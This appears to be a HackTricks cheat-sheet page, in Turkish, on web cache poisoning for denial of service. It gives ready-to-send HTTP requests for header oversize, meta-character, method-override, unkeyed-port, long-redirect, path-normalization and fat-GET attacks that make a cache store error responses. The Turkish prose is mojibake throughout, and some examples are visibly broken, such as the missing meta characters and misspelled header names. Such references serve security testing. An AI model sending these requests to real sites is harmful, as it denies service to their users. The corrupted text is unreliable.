# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
Bu sayfada, **Ã¶nbellek sunucularÄ± iÃ§in geÃ§erli olan** isteklere **web sunucusunun hatalarla yanÄ±t vermesini** saÄŸlamak iÃ§in denemek Ã¼zere farklÄ± varyasyonlar bulabilirsiniz.
{% endhint %}

* **HTTP Header Oversize (HHO)**

Web sunucusunun desteklediÄŸinden daha bÃ¼yÃ¼k ama Ã¶nbellek sunucusunun desteklediÄŸinden daha kÃ¼Ã§Ã¼k bir baÅŸlÄ±k boyutuyla bir istek gÃ¶nderin. Web sunucusu, Ã¶nbelleÄŸe alÄ±nabilecek bir 400 yanÄ±tÄ± ile yanÄ±t verecektir:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTP Meta Karakteri (HMC) & Beklenmeyen DeÄŸerler**

ZararlÄ± **meta karakterler** iÃ§eren bir baÅŸlÄ±k gÃ¶nderin, Ã¶rneÄŸin  ve . SaldÄ±rÄ±nÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in Ã¶nce Ã¶nbelleÄŸi aÅŸmalÄ±sÄ±nÄ±z.
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
KÃ¶tÃ¼ yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir baÅŸlÄ±k sadece `\:` olarak bir baÅŸlÄ±k olabilir.

Bu, beklenmeyen deÄŸerler gÃ¶nderildiÄŸinde de Ã§alÄ±ÅŸabilir, Ã¶rneÄŸin beklenmeyen Content-Type: gibi.
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **AnahtarsÄ±z baÅŸlÄ±k**

BazÄ± web siteleri, _X-Amz-Website-Location-Redirect: someThing_ baÅŸlÄ±ÄŸÄ± gibi istekteki belirli baÅŸlÄ±klarÄ± **gÃ¶rdÃ¼klerinde** bir hata durum kodu dÃ¶ndÃ¼recektir:
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTP YÃ¶ntem AÅŸÄ±mÄ± SaldÄ±rÄ±sÄ± (HMO)**

EÄŸer sunucu `X-HTTP-Method-Override`, `X-HTTP-Method` veya `X-Method-Override` gibi baÅŸlÄ±klarla HTTP yÃ¶ntemini deÄŸiÅŸtirmeyi destekliyorsa, sunucu tarafÄ±ndan desteklenmeyen bir yÃ¶ntemle geÃ§erli bir sayfa talep etmek mÃ¼mkÃ¼ndÃ¼r, bÃ¶ylece kÃ¶tÃ¼ bir yanÄ±t Ã¶nbelleÄŸe alÄ±nÄ±r:
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **AnahtarsÄ±z Port**

EÄŸer Host baÅŸlÄ±ÄŸÄ±ndaki port, yanÄ±tta yansÄ±tÄ±lÄ±yorsa ve Ã¶nbellek anahtarÄ±na dahil edilmemiÅŸse, kullanÄ±lmayan bir porta yÃ¶nlendirmek mÃ¼mkÃ¼ndÃ¼r:
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **Uzun YÃ¶nlendirme DoS**

AÅŸaÄŸÄ±daki Ã¶rnekte olduÄŸu gibi, x Ã¶nbelleÄŸe alÄ±nmÄ±yor, bu nedenle bir saldÄ±rgan, yÃ¶nlendirme yanÄ±t davranÄ±ÅŸÄ±nÄ± kÃ¶tÃ¼ye kullanarak yÃ¶nlendirmenin o kadar bÃ¼yÃ¼k bir URL gÃ¶ndermesini saÄŸlayabilir ki bu bir hata dÃ¶ndÃ¼rsÃ¼n. ArdÄ±ndan, Ã¶nbelleÄŸe alÄ±nmamÄ±ÅŸ x anahtarÄ± olmadan URL'ye eriÅŸmeye Ã§alÄ±ÅŸan kiÅŸiler hata yanÄ±tÄ± alacaklar:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **Host baÅŸlÄ±ÄŸÄ± bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf normalizasyonu**

Host baÅŸlÄ±ÄŸÄ± bÃ¼yÃ¼k/kÃ¼Ã§Ã¼k harf duyarsÄ±z olmalÄ±dÄ±r ancak bazÄ± web siteleri bunun kÃ¼Ã§Ã¼k harfle yazÄ±lmasÄ±nÄ± bekler ve eÄŸer deÄŸilse bir hata dÃ¶ner:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **Yol normalizasyonu**

BazÄ± sayfalar, yolda veri URLencode gÃ¶nderildiÄŸinde hata kodlarÄ± dÃ¶ndÃ¼recektir, ancak, Ã¶nbellek sunucusu yolu URLdecode edecek ve yanÄ±tÄ± URLdecoded yol iÃ§in saklayacaktÄ±r:
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

BazÄ± Ã¶nbellek sunucularÄ±, Cloudflare gibi, veya web sunucularÄ±, gÃ¶vdesi olan GET isteklerini durdurur, bu nedenle geÃ§ersiz bir yanÄ±tÄ± Ã¶nbelleÄŸe almak iÃ§in kÃ¶tÃ¼ye kullanÄ±labilir:
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## Referanslar

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'Ä± takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
